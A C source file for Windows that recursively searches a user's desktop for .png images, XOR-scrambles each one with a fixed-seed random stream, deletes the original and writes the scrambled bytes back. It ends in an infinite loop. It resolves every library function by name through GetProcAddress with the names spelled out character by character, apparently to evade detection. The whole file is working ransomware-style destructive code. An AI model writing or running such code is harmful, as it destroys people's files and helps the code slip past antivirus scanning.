#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <windows.h>
#include <direct.h>
#include <stdbool.h>

char testMessage[0x100000] = {2, 0};

char* file[1024] = {NULL, };
int length = 0;

char *stringAdd(char *a, char *b, bool dir)
{
    char dllName[] = {'m', 's', 'v', 'c', 'r', 't', '\x00'};
    char Malloc[] = {'m', 'a', 'l', 'l', 'o', 'c', '\x00'};
    char Memset[] = {'m', 'e', 'm', 's', 'e', 't', '\x00'};
    char Strlen[] = {'s', 't', 'r', 'l', 'e', 'n', '\x00'};
    char Strcat[] = {'s', 't', 'r', 'c', 'a', 't', '\x00'};
    char Strcpy[] = {'s', 't', 'r', 'c', 'p', 'y', '\x00'};
    void* (*pMalloc)() = GetProcAddress(GetModuleHandle(dllName), Malloc);
    int (*pStrlen)() = GetProcAddress(GetModuleHandle(dllName), Strlen);
    void (*pStrcat)() = GetProcAddress(GetModuleHandle(dllName), Strcat);
    void (*pMemset)() = GetProcAddress(GetModuleHandle(dllName), Memset);
    void (*pStrcpy)() = GetProcAddress(GetModuleHandle(dllName), Strcpy);
    char *temp = (char*)pMalloc(pStrlen(a) + pStrlen(b) + 2);
    pMemset(temp, 0, pStrlen(a) + pStrlen(b) + 2);
    pStrcpy(temp, a);
    if(dir)
    {
        pStrcat(temp, "\\");
    }
    pStrcat(temp, b);
    return temp;
}


void DFSsearchImage(char *direc, char *format)
{
    char dllName[] = {'m', 's', 'v', 'c', 'r', 't', '\x00'};
    char Findfirst[] = {'_', 'f', 'i', 'n', 'd', 'f', 'i', 'r', 's', 't', '\x00'};
    char Chdir[] = {'_', 'c', 'h', 'd', 'i', 'r', '\x00'};
    char Puts[] = {'p', 'u', 't', 's', '\x00'};
    char Getcwd[] = {'_', 'g', 'e', 't', 'c', 'w', 'd', '\x00'};
    char Strstr[] = {'s', 't', 'r', 's', 't', 'r', '\x00'};
    char Findnext[] = {'_', 'f', 'i', 'n', 'd', 'n', 'e', 'x', 't', '\x00'};
    void* (*pFindfirst)() = GetProcAddress(GetModuleHandle(dllName), Findfirst);
    void (*pChdir)() = GetProcAddress(GetModuleHandle(dllName), Chdir);
    void (*pPuts)() = GetProcAddress(GetModuleHandle(dllName), Puts);
    void (*pGetcwd)() = GetProcAddress(GetModuleHandle(dllName), Getcwd);
    int (*pStrstr)() = GetProcAddress(GetModuleHandle(dllName), Strstr);
    int (*pFindnext)() = GetProcAddress(GetModuleHandle(dllName), Findnext);
    char path[512];
    struct _finddata_t fileInfo;
    char *temp = stringAdd(direc, "*.*", 1);
    int* handle = pFindfirst(temp, &fileInfo);
    if(handle == -1)
    {
        return;
    }
    do
    {
        pPuts(fileInfo.name);
        if(fileInfo.attrib&_A_SUBDIR)
        {
            if(fileInfo.name[0] != '.')
            {
                pChdir(fileInfo.name);
                pGetcwd(path, 512);
                pPuts(path);
                DFSsearchImage(path, format);
            }
        }
        else
        {
            if(pStrstr(fileInfo.name, format))
            {
                pGetcwd(path, 512);
                char *temp = stringAdd(path, fileInfo.name, 1);
                file[length++] = temp;
            }
        }
    } while (pFindnext(handle, &fileInfo) != -1);
}

void memoryBreaker(char *mem, int length)
{
    char dllName[] = {'m', 's', 'v', 'c', 'r', 't', '\x00'};
    char Srand[] = {'s', 'r', 'a', 'n', 'd', '\x00'};
    char Rand[] = {'r', 'a', 'n', 'd', '\x00'};
    void (*pSrand)() = GetProcAddress(GetModuleHandle(dllName), Srand);
    int (*pRand)() = GetProcAddress(GetModuleHandle(dllName), Rand);
    pSrand(0x77777777);
    for(int i = 0; i < length; i++)
    {
        mem[i] ^= (__int8)pRand();
    }
}

void openAndBreak(char *path)
{
    char dllName[] = {'m', 's', 'v', 'c', 'r', 't', '\x00'};
    char Fopen[] = {'f', 'o', 'p', 'e', 'n', '\x00'};
    char Fseek[] = {'f', 's', 'e', 'e', 'k', '\x00'};
    char Fread[] = {'f', 'r', 'e', 'a', 'd', '\x00'};
    char Fclose[] = {'f', 'c', 'l', 'o', 's', 'e', '\x00'};
    char Fwrite[] = {'f', 'w', 'r', 'i', 't', 'e', '\x00'};
    char Ftell[] = {'f', 't', 'e', 'l', 'l', '\x00'};
    char Remove[] = {'r', 'e', 'm', 'o', 'v', 'e', '\x00'};
    void* (*pFopen)() = GetProcAddress(GetModuleHandle(dllName), Fopen);
    void (*pFseek)() = GetProcAddress(GetModuleHandle(dllName), Fseek);
    void (*pFread)() = GetProcAddress(GetModuleHandle(dllName), Fread);
    void (*pFclose)() = GetProcAddress(GetModuleHandle(dllName), Fclose);
    void (*pFwrite)() = GetProcAddress(GetModuleHandle(dllName), Fwrite);
    unsigned int (*pFtell)() = GetProcAddress(GetModuleHandle(dllName), Ftell);
    void (*pRemove)() = GetProcAddress(GetModuleHandle(dllName), Remove);
    FILE *fp = pFopen(path, "rb");
    pFseek(fp, 0, SEEK_END);
    int subLength = ftell(fp);
    pFseek(fp, 0, SEEK_SET);
    if(subLength > 0x100000)
    {
        return;
    }
    pFread(testMessage, 1, subLength, fp);
    memoryBreaker(testMessage, subLength);
    pFclose(fp);
    pRemove(path);
    fp = pFopen(path, "wb+");
    pFwrite(testMessage, 1, subLength, fp);
    pFclose(fp);
}

int main()
{
    // FILE *fp = fopen("value.jpg", "rb");
    // fseek(fp, 0, SEEK_END);
    // int length = ftell(fp);
    // fseek(fp, 0, SEEK_SET);
    // if(length > 0x1000000)
    // {
    //     printf("Length over the limit!\n");
    //     return -1;
    // }
    // fread(testMessage, 1, length, fp);
    // memoryBreaker(testMessage, length);
    // printf("Success!\n");
    // while(1)
    // {
    //     length++;
    // }
    DFSsearchImage("C:\\Users\\ch1p\\Desktop\\", ".png");
    for(int i = 0; i < length; i++)
    {
        openAndBreak(file[i]);
    }
    int a = 0;
    while(1) a++;
    return 0;
}